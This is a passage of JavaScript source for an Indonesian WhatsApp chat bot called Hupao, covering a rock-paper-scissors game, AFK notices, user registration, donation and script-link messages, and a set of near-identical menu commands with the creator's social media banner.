if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
hupao.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
hupao.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) hupao.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) hupao.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) hupao.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
hupao.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) hupao.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) hupao.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
hupao.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//
switch(command) {
        case 'daftar':
                if (groupMute) return 'error'
                if (isRegistered) return errorReply ('Kamu sudah terdaftar')
                if (!q.includes('|')) return errorReply ('Format salah!')
                const namaUser = q.substring(0, q.indexOf('|') - 0)
                const umurUser = q.substring(q.lastIndexOf('|') + 1)
                const serialUser = createSerial(20)
                if(isNaN(umurUser)) return errorReply ('Umur harus berupa angka!!')
                if (namaUser.length >= 30) return errorReply (`Namamu terlalu panjang`)
                if (umurUser > 50) return errorReply (`Dasar tua, kamu terlalu tua!!`)
                if (umurUser < 12) return errorReply (`Dasar bocil, kamu terlalu kecil!!`)
				mzd = `Kamu telah terdaftar dengan informasi sebagai berikut:\n\n❏ Nama : ${namaUser}\n❏ Umur : ${umurUser}\n❏ Nomor : wa.me/${m.sender.split("@")[0]}\n❏ NS : ${serialUser}`
                veri = m.sender
                if (!m.isGroup) {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    hupao.sendMessage(m.chat, {image: thum, caption: mzd}, {quoted: m})
                    
                } else {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    hupao.sendMessage(m.chat, {image: thum, caption: mzd}, {quoted: m})
                    
                }
		break   
case "menu":
       case "help":
        if (groupMute) return 'error'
       await loading()
       let menuu = `
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆

${menu}`;
     hupao.sendMessage(from, { video: vidmenu, gifPlayback: true, caption: menuu, contextInfo:{ externalAdReply: {
title: botname,
body: `𝙅𝙖𝙣𝙜𝙖𝙣 𝙎𝙥𝙖𝙢 𝙆𝙖𝙘𝙠🙃`,
thumbnail: thum,
mediaType: 1,
thumbnailUrl: "",
renderLargerThumbnail: true,
sourceUrl: `https://chat.whatsapp.com/Lhw9jBIZnBDF7wkEcwyZ1D`,
}}}, { quoted: fkontak })
        
break

case "all":
       case "allmenu":
       case "taall":
        if (groupMute) return 'error'
    //   if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
       await loading()
       let hupaoall = `
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆

${taall}`; hupao.sendMessage(from, { video: vidmenu, gifPlayback: true, caption: hupaoall, contextInfo:{ externalAdReply: {
title: botname,
body: `𝙅𝙖𝙣𝙜𝙖𝙣 𝙎𝙥𝙖𝙢 𝙆𝙖𝙘𝙠🙃`,
thumbnail: thum,
mediaType: 1,
thumbnailUrl: "",
renderLargerThumbnail: true,
sourceUrl: `https://chat.whatsapp.com/Lhw9jBIZnBDF7wkEcwyZ1D`,
}}}, { quoted: fkontak })
       break
       
case "script": 
      case "sc":
        if (groupMute) return 'error'
 hupao.relayMessage(m.chat, {
                "requestPaymentMessage": {
                    amount: {
                        value: 2022000,
                        offset: 0,
                        currencyCode: 'IDR'
                    },
                    amount1000: 1000000000000000,
                    background: null,
                    currencyCodeIso4217: 'USD',
                    expiryTimestamp: 0,
                    noteMessage: {
                        extendedTextMessage: {
                            text: 
                            
                            `
Hay Kak ${pushname} 👋
Selamat ${ucapanWaktu}


 _Unduh Script Ini Melalui Tautan Dibawah Ini_
 *_https://github.com/boedzhanks/Hupao_*
•-------------------------------------------------•`
                        }
                    },
                    requestFrom: m.sender
                }
            }, {})
break
        case 'jodoh': {
            if (groupMute) return 'error'
            if (!m.isGroup) return m.reply('khusus grup oyy')
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
hupao.sendMessage(m.chat,
{ text: `👩‍❤️‍👨 Jodohmu Adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./base/image/mamak.jpg`),
"sourceUrl": `${hupao}`}}},
{ quoted: m})        
            }
            break
 
//=================================================//
case 'ownermenu': {
    if (groupMute) return 'error'
//if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
await loading()
const owned = `${owner}@s.whatsapp.net`
const version = 2
const text12 =`
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆

${ownermenu} `
hupao.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: fkontak })
}
break
case "tqto": 
if (groupMute) return 'error'
 const owned = `${owner}@s.whatsapp.net`
const version = 2
const text12 = `*Hi ${pushname}👋*

▭▬▭▬▭▬▭▬▭▬▭▬▭▬
「 *BOT INFO* 」
❏ Nama Creator : *Boedzhanks*
❏ Nomor Creator : *wa.me/6283129109022*
❏ Nama Script : *Hupao*
❏ Versi Script : *1.0.0*
❏ Botz Name : *Hupao*
❏ Type Baileys : *Case*
▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*Thanks To*

❏ Hw Mods
❏ Boedzhanks (Gw Sendiri)
❏ Temen Temen Gw

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

hupao.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/984ec7737ca62fc16e87e.jpg',
sourceUrl: "https://chat.whatsapp.com/Lhw9jBIZnBDF7wkEcwyZ1D",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
await hupao.sendMessage(m.chat, {audio: fs.readFileSync('./audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})

break
case "sosmed": 
if (groupMute) return 'error'
 tex = `*Hi ${pushname}👋*

*_Social Media_*
*❏ Instagram*
> https://www.instagram.com/boedzhanks.store
*❏ Facebook*
> https://www.facebook.com/boedzhanks.store
*❏ Github*
> https://github.com/Boedzhanks
*❏ Tiktok*
> https://tiktok.com/@boedzhanks
*❏ Whatsapp*
> https://chat.whatsapp.com/Lhw9jBIZnBDF7wkEcwyZ1D


Powered By Boedzhanks
▬▭▬▭▬▭▬▭▬▭▬▭▬`
await hupao.sendMessage(from, { video: vidmenu, gifPlayback: true, caption: tex, contextInfo:{ externalAdReply: {
    title: botname,
    body: `Bantu Follow ya Kak🙃`,
    thumbnail: thum,
    mediaType: 1,
    thumbnailUrl: "",
    renderLargerThumbnail: true,
    sourceUrl: `https://chat.whatsapp.com/Lhw9jBIZnBDF7wkEcwyZ1D`,
    }}}, { quoted: fkontak })
await hupao.sendMessage(m.chat, {audio: fs.readFileSync('./audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})

break

case "donasi": 
      case "donate": 
              if (groupMute) return 'error'
 hupao.relayMessage(m.chat, {
                "requestPaymentMessage": {
                    amount: {
                        value: 2022000,
                        offset: 0,
                        currencyCode: 'IDR'
                    },
                    amount1000: 1000000000000000,
                    background: null,
                    currencyCodeIso4217: 'USD',
                    expiryTimestamp: 0,
                    noteMessage: {
                        extendedTextMessage: {
                            text: 
                            
                            `
  ╭───── Hupao ─────
  
        𝗗𝗮𝗻𝗮   : ${dana}
        𝗚𝗼𝗽𝗮𝘆  : ${gopay}
        𝗣𝘂𝗹𝘀𝗮   : ${pulsa}
        
  _Terima Kasih Atas Donasinya :>_  
        
  └──── 𝙱𝚢 Boedzhanks ──┘`
                        }
                    },
                    requestFrom: m.sender
                }
            }, {})
break
//=================================================//
case 'animemenu': {
    if (groupMute) return 'error'
    //if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
        await loading()
    reply(`
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆
    
    ${animemenu}`)
    }
    break
//=================================================//
case 'groupmenu': {
    if (groupMute) return 'error'
//if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
    await loading()
reply(`
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆

${groupmenu}`)
}
break
//=================================================//
case 'tools': case 'tool': {
    if (groupMute) return 'error'
//if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
     await loading()
reply(`
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆

${tools} `)
}
break
//=================================================//
case 'tools': case 'tool': {
    if (groupMute) return 'error'
//if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
     await loading()
reply(`
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆

${tools} `)
}
break//=================================================//
case 'downloadmenu': case 'download': {
    if (groupMute) return 'error'
//if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
     await loading()
reply(`
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆

${downloadmenu} `)
}
break
//=================================================//
 case 'randommenu': {
    if (groupMute) return 'error'
 //if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
    await loading()
reply(`
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆

${randommenu}`)
}
break
//=================================================//
case 'textmaker':
    if (groupMute) return 'error'
//if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
await loading()
let foottggkzo = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆

${textmaker}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": foottggkzo, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//
case 'infomenu':
    if (groupMute) return 'error'
//if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
   if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
let footgkzoo = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆

${infomenu}
`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": footgkzoo, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//

        //
        
       case 'addmenu':
        if (groupMute) return 'error'
     //  if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
     if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
reply(`
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
║ Discord : Boedzhanks#0001
╙╼━━━━━━━━━━━━━━━❆

${addmenu} `)
break
//=================================================//

        //=========================================//
case 'funmenu':
    if (groupMute) return 'error'
//if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
     if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
let fooutgkzz = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `
╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║    『 Hupao by Boedzhanks 』
╙╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
    بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

Hallo Kak ${pushname} 👋
Selamat ${ucapanWaktu} 😊

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║        Information
║ Bot Name : Hupao
║ Owner : ${ownername}
║ Daftar User : *${("id", db_user).length}*
║ Type Baileys : *Case*
║ Versi Bot : *1.0.0*
║ Nomor Bot : *wa.me/447389671237*
║ ${runtime(process.uptime())}
║ ${hariini}
║ ${time} WIB
╙╼━━━━━━━━━━━━━━━❆

╓╼━━━━━━❲ 𝓱𝓾𝓹𝓪𝓸 ᵇᵒᵗ ❳━━━━━━━❆
║       Social Media
║ Instagram : @boedzhanks.store
║ Facebook : Hardiansyah Ramadhani
║ Tiktok : @boedzhanks
